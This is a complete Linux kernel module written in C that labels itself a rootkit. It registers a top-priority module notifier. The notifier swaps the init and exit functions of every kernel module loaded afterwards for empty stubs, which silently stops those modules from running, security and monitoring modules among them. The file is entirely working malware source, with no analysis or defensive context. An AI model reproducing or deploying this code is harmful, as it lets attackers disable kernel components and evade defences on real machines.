#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/notifier.h>
#include <linux/init.h>
#include <linux/types.h>
#include <linux/module.h>

MODULE_LICENSE("GPL");

static int fake_init(void);

static void fake_exit(void);

int my_notifier_call(struct notifier_block *nb, unsigned long action, void *data);

struct notifier_block nb = {
    .notifier_call = my_notifier_call,
    .priority = INT_MAX,
};

int my_notifier_call(struct notifier_block *nb, unsigned long action, void *data) {
    struct module *module;
    unsigned long flags;
    DEFINE_SPINLOCK(module_notifier_spinlock);

    module = data;
    printk(KERN_INFO "Processing the module: %s\n", module->name);

    spin_lock_irqsave(&module_notifier_spinlock, flags);
    switch (module->state) {
        case MODULE_STATE_COMING:
            printk(KERN_INFO "Replacing init and exit functions: %s.\n", module->name);
            module->init = fake_init;
            module->exit = fake_exit;
            break;
        default:
            break;
    }
    spin_unlock_irqrestore(&module_notifier_spinlock, flags);

    return NOTIFY_DONE;
}

static int fake_init(void) {
    printk(KERN_INFO "fake_init lanuched.\n");
    return 0;
}

static void fake_exit(void) {
    printk(KERN_INFO "fake_exit ended\n");
    return ;
}

static int __init mode_init(void) {
    printk(KERN_INFO "Rootkit is entering.\n");
    register_module_notifier(&nb);    
    return 0;
}

static void __exit mode_exit(void) {
    unregister_module_notifier(&nb);
    printk(KERN_INFO "Rootkit is leaving.\n");
}

module_init(mode_init);
module_exit(mode_exit);